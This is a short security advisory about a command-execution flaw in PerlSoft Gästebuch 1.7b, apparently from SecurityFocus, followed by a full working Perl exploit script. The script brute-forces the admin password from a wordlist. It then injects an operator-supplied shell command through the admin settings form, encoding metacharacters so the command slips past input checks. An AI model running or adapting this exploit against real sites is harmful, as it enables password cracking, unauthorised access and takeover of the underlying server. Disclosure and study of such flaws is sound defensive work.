source: http://www.securityfocus.com/bid/33525/info

PerlSoft Gästebuch is prone to a vulnerability that attackers can leverage to execute arbitrary commands. This issue occurs because the application fails to adequately sanitize user-supplied input. Note that an attacker must have administrative access to the script to exploit this issue.

Successful attacks can compromise the affected application and possibly the underlying computer.

PerlSoft Gästebuch 1.7b is vulnerable; other versions may also be affected.

#!/usr/bin/perl
=pod
Typ: Bruter & RCE
Name: PerlSoft GB Pwner
Affected Software: PerlSoft G�stebuch Version: 1.7b
Coder/Bugfounder: Perforin
Visit: DarK-CodeZ.org
Note: RCE ist only 1 time possible, do not waste your command!
=cut

use strict;
use warnings;
use diagnostics;

use LWP::Simple;
use LWP::Simple::Post qw(post post_xml);

my ($url,$user,$wordlist,$error_counter,$word,$anfrage);
my ($falsch,$richtig,$entry,$rce,$send,$crypted);
my (@response,@rcesend,@array);

if (@ARGV < 4) { &fail; }

($url,$user,$wordlist) = (@ARGV);

$falsch = '<tr><td align=center><Font color="000000" FACE="Arial">Nur Administratoren mit g&uuml;ltigen Benutzerdaten haben Zugang in das Admin-Center!</font></td></tr>';
$richtig = '<tr><td bgcolor=#E0E0E0 align=center><B><Font color="000000" FACE="Arial">G&auml;stebuch Vorlage - Einstellen</font></B></td></tr>';

if ($url !~ m/^http:\/\//) { &fail; }
if ($wordlist !~ m/\.(txt|list|dat)$/) { &fail; }

print <<"show";

--==[Perforins PerlSoft GB Pwner]==--

[+] Attack: $url
[+] User: $user
[+] Wordlist: $wordlist

show
open(WordList,"<","$wordlist") || die "No wordlist found!";
foreach $word (<WordList>) {
chomp($word);
$crypted = crypt($word,"codec");
$anfrage = $url.'?sub=vorlage&id='.$user.'&pw='.$crypted;
@array = get($anfrage) || (print "[-] Cannot connect!\n") && exit;
foreach $entry (@array) {
if ($entry =~ m/$richtig/i) { 
print "\n[+] Password cracked: "."$crypted:$word"." !\n\n";
if ($ARGV[3] =~ m/yes/i ) {
print <<"RCE";
[+] Remote Command Execution possible!
[~] Note: Only _1_ time exploitable, do not waste it!
[+] Please enter your Command!
RCE
chomp($rce = <STDIN>);
$rce =~ s/>/\"\.chr(62)\.\"/ig;
$rce =~ s/</\"\.chr(60)\.\"/ig;
$rce =~ s/\|/\"\.chr(124)\.\"/ig;
$rce =~ s/&/\"\.chr(38)\.\"/ig;
$rce =~ s/\//\"\.chr(47)\.\"/ig;
$rce =~ s/-/\"\.chr(45)\.\"/ig;
$send = 'loginname='.$user.'&loginpw='.$word.'&loginname1='.$user.'";system("'.$rce.'");print "h4x&loginpw1='.$word.'&loginpw2='.$word.'&id='.$user.'&pw='.$crypted.'&sub=saveadmindaten';
@response = post($url, $send);
@rcesend = get($url) || (print "[-] Cannot connect!\n") && exit;
print <<"END";
[+] Command executed!

---====[www.vx.perforin.de.vu]====---
END
exit;
} else { (print "---====[www.vx.perforin.de.vu]====---\n") and exit; }
} elsif ($entry =~ m/$falsch/i) {
$error_counter++;
print "[~] Tested ".$error_counter.": "."$crypted:$word"."\n";
}
}
}
close(WordList);
print "[-] Could not be cracked!\n";
exit;
sub fail {
print <<"CONFIG";
+-------------------+
|                   |
| PerlSoft GB Pwner |
|       v0.1        |
|                   |
+-------------------+-----[Coded by Perforin]-----------------------------+
|                                                                         |
| brute.pl http://www.example.com/cgi-bin/admincenter.cgi admin wordlist.txt yes |
| brute.pl http://www.example.com/cgi-bin/admincenter.cgi admin wordlist.txt no  |
|                                                                         |
| yes = Remote Command Execution                                          |
| no = No Remote Command Execution                                        |
|                                                                         |
+-------------------------[vx.perforin.de.vu]-----------------------------+
CONFIG
exit;
}
